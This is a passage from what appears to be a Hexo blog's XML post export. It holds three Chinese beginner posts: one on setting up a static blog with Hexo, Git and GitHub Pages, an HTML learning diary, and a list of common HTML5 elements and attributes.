  <entry>
    <title>记录一些心得</title>
    <url>/2019/12/01/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<h2 id="使用hexo-git建立一个静态的个人博客"><a href="#使用hexo-git建立一个静态的个人博客" class="headerlink" title="使用hexo git建立一个静态的个人博客"></a><strong>使用hexo git建立一个静态的个人博客</strong></h2><hr>
<h3 id="下载Git"><a href="#下载Git" class="headerlink" title="下载Git"></a>下载Git</h3><p><a href="https://git-scm.com/">Git</a></p>
<ul>
<li>点击<code>Download</code>即可下载</li>
<li>之后一路傻瓜操作就安装完成了</li>
<li>创建<a href="https://github.com/">GitHub</a>账户</li>
<li>安装完成以后还要和自己的Github账号关联(百度上有很多很多这样的教程，随便找一个即可)</li>
</ul>
<hr>
<p><strong>配置完以后，在桌面空白处右击，选择Git Bash Here 就可以打开终端窗口</strong></p>
<h3 id="下载node-js框架"><a href="#下载node-js框架" class="headerlink" title="下载node.js框架"></a>下载node.js框架</h3><p><a href="http://nodejs.org/">node.js</a></p>
<ul>
<li>同样是点击<code>Download</code>即可下载</li>
<li>同样是一路傻瓜操作就安装上了</li>
<li>这个时候打开<code>Git Bash Here</code>，<br>输入<code>node -v</code>可以查看版本信息，并确定node.js框架安装成功</li>
<li>安装node.js框架的时候会自动安装<code>npm</code>，我们也可以输入<code>npm -v</code> 来确认npm安装成功</li>
</ul>
<hr>
<h3 id="新建一个GitHub仓库"><a href="#新建一个GitHub仓库" class="headerlink" title="新建一个GitHub仓库"></a>新建一个GitHub仓库</h3><ul>
<li>首先登录到<a href="https://github.com/">GitHub</a>上，点击<code>+</code>，再选择<code>New repository</code></li>
<li>选择合适的Repository name 然后写成如下格式<code>reponame.github.io</code><br><u><strong>reponame就是随便你自己起的ID</strong></u></li>
<li>然后点击<code>Create repository</code>便创建成功</li>
</ul>
<hr>
<h3 id="安装cnpm-使用淘宝的源"><a href="#安装cnpm-使用淘宝的源" class="headerlink" title="安装cnpm(使用淘宝的源)"></a>安装cnpm(使用淘宝的源)</h3><ul>
<li>打开<code>Git Bash Here</code></li>
<li>输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></li>
<li>输入<code>cnpm install -g hexo-cli</code>下载hexo博客框架</li>
</ul>
<hr>
<h3 id="初始化hexo"><a href="#初始化hexo" class="headerlink" title="初始化hexo"></a>初始化hexo</h3><ul>
<li>创建一个文件夹，用来存放blog文件(如果发生了奇奇怪怪的错误，不要紧，把这个文件夹里的内容删除就可以重新开始了)</li>
<li>cd进创建的文件夹</li>
<li>输入<code>hexo init</code>初始化一个博客</li>
<li>输入<code>hexo s</code>即可生成一个本地的博客，默认是在4000端口，如果4000端口被占用，可以使用<code>hexo server port xxxx</code>来指定端口</li>
<li>输入<code>hexo new &lt;title&gt;</code>来创建一篇博客</li>
<li><code>hexo g</code>Generator，字面意思，生成。</li>
</ul>
<hr>
<h3 id="将自己的blog部署在GitHub上"><a href="#将自己的blog部署在GitHub上" class="headerlink" title="将自己的blog部署在GitHub上"></a>将自己的blog部署在GitHub上</h3><ul>
<li>在你创建的文件夹下，有一个<code>_config.yml</code>文件，可以使用<code>vim</code>编辑器打开，也可以使用像<code>vscode</code>或<code>sublim text</code>打开，都是可以的</li>
<li>文件中找到<code>deploy</code>，并修改:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https:&#x2F;&#x2F;github.com&#x2F;reponame&#x2F;reponame.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></li>
<li>输入<code>hexo d</code>即可部署到GitHub</li>
<li>打开浏览器，输入你的仓库地址<code>reponame.github.io</code>,便可以访问你的博客</li>
</ul>
<hr>
<p><strong>以上就是搭建一个简易的博客的全部啦</strong><br><strong>后期可以对自己的博客进行美化，比如更换主题啊之类的</strong></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML日记</title>
    <url>/2021/06/21/HTML%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="HTML日记"><a href="#HTML日记" class="headerlink" title="HTML日记"></a>HTML日记</h2><p>谨以此来记录自己学习HTML的过程</p>
<hr>
<h3 id="Day0：HTML-文档"><a href="#Day0：HTML-文档" class="headerlink" title="Day0：HTML 文档"></a>Day0：HTML 文档</h3><p>作为一个CS人，最最最重要的就是查阅文档的能力。在这里，给大家推荐一个我自己常用的参考手册：<br><a href="https://www.w3school.com.cn/html5/html5_reference.asp">HTML 5 参考手册</a></p>
<p>在这里，顺便说一说自己对于那些前端课程之类的东西的看法吧。</p>
<ul>
<li>课程的主要作用就是给想要去学习的人提供一个教课的环境，有人言传身教的教你肯定是好的。但是在我的角度来说，在CS行业，学习一门新的东西最好的还是实践。当然这东西还是需要看人。视频可以作为辅助，但是一定还是需要自己手动实践，参考文档。</li>
</ul>
<hr>
<h3 id="Day1：HTML-Basic"><a href="#Day1：HTML-Basic" class="headerlink" title="Day1：HTML Basic"></a>Day1：HTML Basic</h3><p>第一天，首先需要了解的肯定是HTML的基本框架。<br>我自己总结如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    xxx</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    xxx</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>当然自己总结的不一定是正确的，在日后的学习中，我会根据日后的学习来调整之前的总结。</p>
<ul>
<li><p>首先说明一下第一个标签：<br><code>&lt;!--  --&gt;</code><br>在<code>HTML</code>中，这个是注释符。当然在现代ide里，注释都是一键操作了。</p>
</li>
<li><p>其次是这个标签<br><code>&lt;!DOCTYPE HTML&gt;</code><br>我们需要分开解读。<code>&lt;!DOCTYPE&gt;</code>是用来定义文档类型，而后面的<code>HTML</code>则表明文档类型是<code>HTML</code>文件。</p>
</li>
<li><p>接下来是<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;body&gt;</code>标签<br><code>&lt;html&gt;</code>标签可以告知浏览器自身是一个HTML文档。<code>&lt;html&gt;</code>与<code>&lt;/html&gt;</code>标签限定了文档的开始点和结束点。文档的头部由<code>&lt;head&gt;</code>定义，主体由<code>&lt;body&gt;</code>定义。</p>
</li>
</ul>
<p><code>&lt;head&gt;</code>标签，最基本的用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;文档的标题&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;!-- 在head标签里，&lt;title&gt;标签是唯一必须的元素 --&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure>
<p>其他适配于<code>&lt;head&gt;</code>的标签如<code>&lt;base&gt;</code>，<code>&lt;link&gt;</code>，<code>&lt;meta&gt;</code>，<code>&lt;script&gt;</code>，<code>&lt;style&gt;</code>，这些我们日后再说。</p>
<p><code>&lt;body&gt;</code>标签，包含文档的所有内容，包括但不限于文本、超链接、图片、表格等。</p>
<p><strong>另外需要注意：<code>&lt;html&gt;</code>，<code>&lt;head&gt;</code>，<code>&lt;body&gt;</code>，<code>&lt;title&gt;</code>标签都是需要<code>CloseTag</code>（结束标签）的，也就是说需要对应的<code>&lt;/xxx&gt;</code>来与之对应。而<code>&lt;!DOCTYPE&gt;</code>则没有<code>CloseTag</code>，之后也会遇到许多这样的标签。</strong></p>
<hr>
<h3 id="Day2：Some-Element-in-“body”-Element"><a href="#Day2：Some-Element-in-“body”-Element" class="headerlink" title="Day2：Some Element in “body” Element"></a>Day2：Some Element in “body” Element</h3><p>第二天，今天来学习一些比较简单的标签。<br><code>&lt;a&gt;</code>，<code>&lt;br&gt;</code>，<code>&lt;p&gt;</code>，<code>&lt;button&gt;</code>，<code>&lt;em&gt;</code>，<code>&lt;strong&gt;</code>，<code>&lt;h1&gt;</code> to <code>&lt;h6&gt;</code><br>按照顺序来说。</p>
<ul>
<li><p><code>&lt;a&gt;</code>是超链接标签，用法如下<br><code>&lt;a href=&quot;url&quot;&gt;超链接的描述&lt;/a&gt;</code><br>这里要注意的点有两个，一个是<code>&lt;a&gt;</code>内部要使用<code>href</code>，而不是<code>src</code>，另一个是<code>&lt;a&gt;</code>标签是需要结束标签的(<code>&lt;/a&gt;</code>)。</p>
</li>
<li><p><code>&lt;br&gt;</code>是一个标准的换行符。<br>没有什么可以说的，但是需要注意几个点：<br><code>&lt;br&gt;</code>是一个空标签，也就是意味着它不需要结束标签。因此<code>&lt;br&gt;&lt;/br&gt;</code>是错误的。<br><code>&lt;br&gt;</code>只是一个简单的开始新的一行，而当浏览器遇到<code>&lt;p&gt;</code>标签时，通常会在相邻的段落之间插入一些垂直的间距。因此，<strong>请使用<code>&lt;br&gt;</code>来输入空行，而不是分割段落。</strong></p>
</li>
<li><p><code>&lt;p&gt;</code>标签定义段落。<br>需要注意的是<code>&lt;p&gt;</code>元素会自动在其前后创建一些空白。浏览器会自动添加这些空间，您也可以在样式表中规定。<code>&lt;p&gt;</code>元素也是需要结束标签的。<br>exp： <code>&lt;p&gt;这是段落&lt;/p&gt;</code><br>在该元素中，我们可以使用<code>align</code>属性，用来规定段落中文本的对齐方式。但是不推荐。</p>
</li>
<li><p><code>&lt;button&gt;</code>标签定义一个按钮。<br><code>&lt;button&gt;</code>拥有两个常用的属性，<code>name</code>属性和<code>type</code>属性。<br><code>name</code>属性规定按钮的名称，<code>type</code>属性规定按钮的类型，分别有<code>button</code>，<code>submit</code>，<code>reset</code>三种类型。<br>exp：<code>&lt;button type=&quot;button&quot;&gt;Login&lt;/button&gt;</code><br>需要注意的一个点是<code>&lt;button&gt;</code>和<code>&lt;input type=&quot;button&quot; value=&quot;xxx&quot;&gt;</code>的<a href="https://www.cnblogs.com/purediy/archive/2012/06/10/2544184.html">区别</a>。</p>
</li>
<li><p><code>&lt;em&gt;</code>和<code>&lt;strong&gt;</code>放在一起说。<br>根据字面意思，<code>&lt;em&gt;</code>表示强调内容，<code>&lt;strong&gt;</code>表示重要内容。<br>exp：<code>&lt;em&gt;emphasis&lt;/em&gt;</code>, <code>&lt;strong&gt;strong&lt;/strong&gt;</code>, <code>&lt;em&gt;&lt;strong&gt;emphasis-strong&lt;/strong&gt;&lt;/em&gt;</code></p>
</li>
</ul>
<p>-&gt; <em>emphasis</em>, <strong>strong</strong>, <em><strong>emphasis-strong</strong></em></p>
<ul>
<li><code>&lt;h1&gt;</code> to <code>&lt;h6&gt;</code><br><code>&lt;h1&gt; - &lt;h6&gt;</code>标签可定义标题。<code>&lt;h1&gt;</code>定义最大的标题。<code>&lt;h6&gt;</code>定义最小的标题。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;这是标题 1&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2&gt;这是标题 2&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;h3&gt;这是标题 3&lt;&#x2F;h3&gt;</span><br><span class="line">&lt;h4&gt;这是标题 4&lt;&#x2F;h4&gt;</span><br><span class="line">&lt;h5&gt;这是标题 5&lt;&#x2F;h5&gt;</span><br><span class="line">&lt;h6&gt;这是标题 6&lt;&#x2F;h6&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="Day3：”meta”-Element-is-Important"><a href="#Day3：”meta”-Element-is-Important" class="headerlink" title="Day3：”meta” Element is Important"></a>Day3：”meta” Element is Important</h3><p>第三天,介绍一个在第一天忘记说的东西。<code>&lt;meta&gt;</code>标签。也是一个我认为的<code>HTML</code>的一个非常重要的点，也是一个难点。</p>
<ul>
<li><code>&lt;meta&gt;</code>标签可提供有关页面的元信息（meta-information），<code>&lt;meta&gt;</code>标签的属性定义了与文档相关联的键值对。</li>
</ul>
<p>注意：1. <code>&lt;meta&gt;</code>标签永远位于<code>&lt;head&gt;</code>内部，且没有结束标签。2. 元数据总以键值对的形式被传递。</p>
<ul>
<li><code>&lt;meta&gt;</code>标签必需的属性有<code>content</code>，可选的属性有<code>http-equiv</code>,<code>name</code>,<code>scheme</code>。<br>下面我就来分别解释。</li>
<li><code>name</code>属性提供了键值对中的名称。通常情况下，您可以自由使用对自己和源文档的读者来说富有意义的名称。<code>keywords</code>是一个经常被用到的名称。它为文档定义了一组关键字。某些搜索引擎在遇到这些关键字时，会用这些关键字对文档进行分类。<br>类似这样的 meta 标签可能对于进入搜索引擎的索引有帮助：<code>&lt;meta name=&quot;keywords&quot; content=&quot;HTML,ASP,PHP,SQL&quot;&gt;</code></li>
<li><code>http-equiv</code>属性为键值对提供了名称。并指示服务器在发送实际的文档之前先在要传送给浏览器的<code>MIME</code>文档头部包含键值对。<br>当服务器向浏览器发送文档时，会先发送许多键值对。虽然有些服务器会发送许多这种键值对，但是所有服务器都至少要发送一个：<code>content-type:text/html</code>。这将告诉浏览器准备接受一个<code>HTML</code>文档。<br>使用带有<code>http-equiv</code>属性的<code>&lt;meta&gt;</code>标签时，服务器将把键值对添加到发送给浏览器的内容头部。例如，添加：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;charset&quot; content&#x3D;&quot;iso-8859-1&quot;&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;expires&quot; content&#x3D;&quot;31 Dec 2008&quot;&gt;</span><br></pre></td></tr></table></figure>
这样发送到浏览器的头部就应该包含：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content-type: text&#x2F;html</span><br><span class="line">charset:iso-8859-1</span><br><span class="line">expires:31 Dec 2008</span><br></pre></td></tr></table></figure>
当然，只有浏览器可以接受这些附加的头部字段，并能以适当的方式使用它们时，这些字段才有意义。</li>
<li><code>content</code>属性<br>content 属性提供了名称/值对中的值。该值可以是任何有效的字符串。<br>content 属性始终要和 name 属性或 http-equiv 属性一起使用</li>
</ul>
<hr>
<h3 id="Day4：Some-the-most-commonly-used-Element-in-“body”-Element"><a href="#Day4：Some-the-most-commonly-used-Element-in-“body”-Element" class="headerlink" title="Day4：Some the most commonly used Element in “body” Element"></a>Day4：Some the most commonly used Element in “body” Element</h3><p>见我的博客</p>
<p><a href="https://abeancc.github.io/2021/06/25/HTML5%E5%B8%B8%E7%94%A8%E7%9A%84%E5%85%83%E7%B4%A0%E5%92%8C%E5%B1%9E%E6%80%A7/">HTML5常用的元素和属性</a></p>
]]></content>
      <categories>
        <category>HTML</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>HTML</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML5常用的元素和属性</title>
    <url>/2021/06/25/HTML5%E5%B8%B8%E7%94%A8%E7%9A%84%E5%85%83%E7%B4%A0%E5%92%8C%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h2 id="HTML5常用的元素和属性"><a href="#HTML5常用的元素和属性" class="headerlink" title="HTML5常用的元素和属性"></a>HTML5常用的元素和属性</h2><p>如下，本文总结了基本的常用的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> - <span class="comment">&lt;!--...--&gt;</span>注释</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>根元素</span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span>页面头部分，可以包含如下子元素</span><br><span class="line">		&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>:包含Javascript脚本</span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; <span class="tag">&lt;<span class="name">noscript</span>&gt;</span>:声明不支持Javascript脚本</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; <span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; <span class="tag">&lt;<span class="name">link</span>&gt;</span>用于链接图标，css样式文件等外部资源</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; <span class="tag">&lt;<span class="name">base</span>&gt;</span>指定页面中所有连接的基准路径</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; <span class="tag">&lt;<span class="name">meta</span>&gt;</span>定义页面元数据</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		&gt;  <span class="tag">&lt;<span class="name">title</span>&gt;</span>页面标题</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> <span class="tag">&lt;<span class="name">body</span>&gt;</span>页面主体部分</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">h1</span>&gt;</span>到<span class="tag">&lt;<span class="name">h6</span>&gt;</span>定义标题一到六</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">p</span>&gt;</span>定义段落</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">br</span>&gt;</span>插入一个换行</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">hr</span>&gt;</span>定义水平线</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">div</span>&gt;</span>定义文档中的节 ，导致换行</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">span</span>&gt;</span>与<span class="tag">&lt;<span class="name">div</span>&gt;</span>相似，区别是只表示一段一般性文本，不会换行</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">b</span>&gt;</span>定义粗体文本</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">i</span>&gt;</span>定义斜体文本</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">em</span>&gt;</span>定义强调文本</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">strong</span>&gt;</span>定义粗体文本，且代表重要文本</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">small</span>&gt;</span>定义小号字体文本,常用于免责声明、注意事项、法路规定、版权相关</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">sup</span>&gt;</span>定义上标文本</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">sub</span>&gt;</span>定义下标文本</span></span></span><br><span class="line"><span class="javascript"> - &lt;bdo&gt;定义文本显示方向，dir=<span class="string">&quot;ltr&quot;</span>，dir=<span class="string">&quot;rtl&quot;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">a</span>&gt;</span>元素添加超链接和锚点：</span></span></span><br><span class="line"> 		超链接：</span><br><span class="line">		&gt; href:指定超链接所链接的另一个资源</span><br><span class="line">		&gt; hreflang:指定超链接所链接的文档所使用的语言</span><br><span class="line">		&gt; target:_self,_blank,_top,_parent,分别代表自身，新窗口，顶层框架，</span><br><span class="line">		  父框架来装在新资源</span><br><span class="line">		&gt; download：不是直接打开目标链接，用于让用户下载目标链接所指向的资源</span><br><span class="line">		&gt; type:指定被链接文档的MIME类型</span><br><span class="line">		&gt; media：指定目标URL所引用的媒体类型，默认值为all，指定href后此属性有效</span><br><span class="line">		锚点：</span><br><span class="line"><span class="javascript">		&gt; <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">		&gt; <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;anchor.html#test&quot;</span>&gt;</span>定位到anchor文件中的锚点</span></span></span><br><span class="line"><span class="javascript">		&gt; <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#test&quot;</span>&gt;</span>定位到同一文档中的test锚点</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">ul</span>&gt;</span>定义无序列表，只能包含<span class="tag">&lt;<span class="name">li...</span>/&gt;</span>子元素</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">li</span>&gt;</span>定义列表项，可以包含于<span class="tag">&lt;<span class="name">div</span>&gt;</span>完全类似的内容</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">ol</span>&gt;</span>定义有序列表：</span></span></span><br><span class="line">		&gt; start：指定列表的其实数字，默认是第一个，如1、和A</span><br><span class="line">		&gt; type：指定使用哪种类型的编号，1代表使用数字，A和a分别代表使用大写或小写字母，</span><br><span class="line">			I或i代 表大写或小写罗马数字</span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">dl</span>&gt;</span>定义术语列表，只能包含<span class="tag">&lt;<span class="name">dt</span>&gt;</span>和<span class="tag">&lt;<span class="name">dd</span>&gt;</span>两种子元素</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">dt</span>&gt;</span>定义标题</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">dd</span>&gt;</span>定义解释</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">img</span>&gt;</span>添加图片，可以使用usemap属性添加图片映射</span></span></span><br><span class="line">		&gt; src:该属性指定文件所在位置，可以是相对路径，也可以是绝对路径</span><br><span class="line">		&gt; alt:指定一段文本，作为图片还没有加载出来时的提示信息</span><br><span class="line">		&gt; height:指定图片高度，可以是百分比，也可以是像素值（px）</span><br><span class="line">		&gt; width:指定图片宽度，可以是百分比，也可以是像素值（px）</span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">map</span>&gt;</span>定义图片映射，主要可以包含一个或多个<span class="tag">&lt;<span class="name">area</span>&gt;</span>子元素，每个area子元素定义一个区域，</span></span></span><br><span class="line">   不同区域可以 连接到不同的URL</span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">area</span>&gt;</span>定义图片映射的内部区域：</span></span></span><br><span class="line">		&gt; shape：指定内部区域是那种区域，默认是“rect”,矩形区域；circle，圆形；ploy，多边形</span><br><span class="line">		&gt; coords:指定多个坐标值，用于确定区域位置</span><br><span class="line">		&gt; href</span><br><span class="line">		&gt; alt</span><br><span class="line">		&gt; trget</span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">table</span>&gt;</span>定义表格，只能包含0个或者1个(<span class="tag">&lt;<span class="name">caption</span>&gt;</span>,<span class="tag">&lt;<span class="name">thead</span>&gt;</span>,<span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>),多个<span class="tag">&lt;<span class="name">tr</span>&gt;</span>,&lt;tbody</span></span></span><br><span class="line">		&gt; cellpadding:指定单元格内容和单元格边框之间的距离，属性值可以是像素（px）,</span><br><span class="line">		  也可以是百分比</span><br><span class="line">		&gt; cellspacing:指定单元格之间的距离，属性值可以是像素（px）,也可以是百分比</span><br><span class="line">		&gt; width:指定表格宽度，属性值可以是像素（px）,也可以是百分</span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">caption</span>&gt;</span>用于定义表格标题</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">tr</span>&gt;</span>定义表格行，只能指定<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>两种子元素</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">td</span>&gt;</span>定义单元格，与<span class="tag">&lt;<span class="name">div</span>&gt;</span>类似，可以再包含一个<span class="tag">&lt;<span class="name">table</span>&gt;</span>元素</span></span></span><br><span class="line">		&gt; colspan:指定单元格夸多少列</span><br><span class="line">		&gt; rowspan:指定单元格夸多少行</span><br><span class="line">		&gt; height:指定单元格高度，属性值可以是像素（px）,也可以是百分</span><br><span class="line">		&gt; width：指定单元格宽度，属性值可以是像素（px）,也可以是百分</span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">th</span>&gt;</span>定义表格的表头元素，显示加粗字体</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">thead</span>&gt;</span>定义表格头</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>定义表格脚</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">tbody</span>&gt;</span>定义表格主体，只能包含多个<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span></span><br><span class="line">		使用方法：</span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; <span class="tag">&lt;<span class="name">thead</span>&gt;</span>,<span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>,<span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span></span></span><br><span class="line">		&gt; src:指定一个URL，指定iframe将装在哪个页面</span><br><span class="line">		&gt; name:设置iframe的名字</span><br><span class="line">		&gt; longdesc:指定一个页面的URL，包含了关于该iframe的长描述</span><br><span class="line">		&gt; scrolling:设置滚动条，该属性支持yes,no,auto</span><br><span class="line">		&gt; height:设置iframe高度</span><br><span class="line">		&gt; width：设置iframe宽度</span><br><span class="line">		&gt; frameborder:设置iframe边框</span><br><span class="line">		&gt; marginheight：设置iframe顶部和底部的页边距</span><br><span class="line">		&gt; marginwidth：设置iframe左侧和右侧的页边距</span><br><span class="line"> - id属性用于为HTML元素指定唯一标识,使用JS编程时可通过该属性</span><br><span class="line"><span class="javascript">   来获取元素&lt;<span class="built_in">document</span>.getElementById(id)&gt;</span></span><br><span class="line"> - style属性用于为HTML元素指定CSS样式</span><br><span class="line"><span class="javascript"> - <span class="class"><span class="keyword">class</span>属性用于匹配<span class="title">CSS</span>样式的<span class="title">class</span>选择器</span></span></span><br><span class="line"><span class="javascript"> - dir属性对齐方式  dir=<span class="string">&quot;ltr&quot;</span>:左对齐   dir=<span class="string">&quot;rtl&quot;</span>右对齐</span></span><br><span class="line"> - title属性显示元素指定额外信息，当用户把鼠标移动到该元素上面时，</span><br><span class="line"> 	浏览器将会显示title属性所制定的信息</span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; 例：<span class="tag">&lt;<span class="name">div</span> <span class="attr">title</span>=<span class="string">&quot;测试专用&quot;</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript"> - contentEditable属性可以指定开发者直接编辑HTML元素的内容，属性值<span class="literal">true</span>，<span class="literal">false</span></span></span><br><span class="line">		&gt; contentEditable属性具有可继承的特点：如果一个元素的父元素时“可编辑的”，</span><br><span class="line"><span class="javascript">		 那么它默认也是可编辑的，除非指定contentEditable=“<span class="literal">false</span>”</span></span><br><span class="line">		&gt; 当用户编辑完成后，用户编辑的内容就会直接显示在该页面中，一旦刷新，</span><br><span class="line">		编辑的内容就会消失，开发者可以通过元素的innerHTML属性来获取编辑后的内容</span><br><span class="line"><span class="javascript"> - iscontentEditable属性指定当该元素处于可编辑状态时，返回<span class="literal">true</span>，否则返回<span class="literal">false</span></span></span><br><span class="line"> - designMode属性相当于是一个全局属性，如果把整个页面的designMode属性设置为on,</span><br><span class="line">   则该页面上所有支持contentEditable的元素都变成可编辑状态，designMode属性默认为off</span><br><span class="line"><span class="javascript"> - hidden属性支持<span class="literal">true</span>和<span class="literal">false</span>两个属性值，一旦把某个元素的hidden设为<span class="literal">true</span>，</span></span><br><span class="line">   就意味着浏览器不在显示该组件，夜不会保留该组件所占的空间</span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; 例：<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;target&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;true style=&quot;</span><span class="attr">heiget:80px</span>&quot;&gt;</span>测试专用<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">			  &lt;button onclick=&quot;var target=document.getElementById(&#x27;target&#x27;);</span><br><span class="line"><span class="handlebars"><span class="xml">			  target.hidden=!getfet.hidden;&quot;&gt;显示/隐藏<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">section</span>&gt;</span>该元素用于对页面内容进行分块</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">link</span>&gt;</span>用于链接图标，css样式文件等外部资源</span></span></span><br><span class="line">		&gt; href</span><br><span class="line">		&gt; hreflang</span><br><span class="line">		&gt; media:所链接的资源仅适用哪些设备</span><br><span class="line">		&gt; rel:设置文档与所链接资源的关系</span><br><span class="line">		&gt; size：指定图标的大小，仅当rel为icon是该属性才有效</span><br><span class="line">		&gt; type</span><br><span class="line">		举例应用：</span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; 引入CSS样式单：<span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;outer.css&quot;</span> <span 